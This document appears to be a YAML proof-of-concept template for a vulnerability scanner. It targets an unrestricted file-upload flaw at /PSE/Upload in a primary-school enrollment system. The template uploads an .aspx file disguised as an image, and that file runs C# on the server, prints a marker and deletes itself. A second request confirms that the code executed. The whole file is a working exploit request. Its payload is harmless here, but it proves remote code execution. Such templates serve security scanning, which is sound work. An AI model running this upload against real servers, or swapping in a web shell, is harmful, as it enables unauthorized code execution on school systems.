name: poc-yaml-zhongxiaoxuezhihui-PSE_Upload-File-upload
transport: http

set:
  randbody: base64Decode("cGJveWpubnJmaXBtcGxzdWtkZWN6dWRzZWZ4bXl3ZQ==")
  rboundary: randomLowercase(8)

rules:
  r0:
    request:
      method: POST
      path: /PSE/Upload
      headers:
        Content-Type: multipart/form-data; boundary=00content0{{rboundary}}
      body: "\
        --00content0{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"file\"; filename=\"test.aspx\"\r\n\
        Content-Type: image/jpg\r\n\
        \r\n\
        <%@ Page Language=\"C#\" %><% Response.Write(\"{{randbody}}\"); System.IO.File.Delete(Request.PhysicalPath); %>\r\n\
        --00content0{{rboundary}}--\r\n\
        "
    expression: response.status == 200
    output:
      search: '"SaveName\":\"(?P<uploadfile>[a-zA-Z0-9-]+\\.aspx)".bsubmatch(response.body)'
      uploadfile: search["uploadfile"]

  r1:
    request:
      method: GET
      path: /Upload/PrimarySchoolEnrollment/{{uploadfile}}
    expression: response.status == 200 && response.body.bcontains(bytes(randbody))

expression: r0() && r1()

detail:
  author: Superhero
  links:
    - https://blog.csdn.net/m0_60571842/article/details/140611357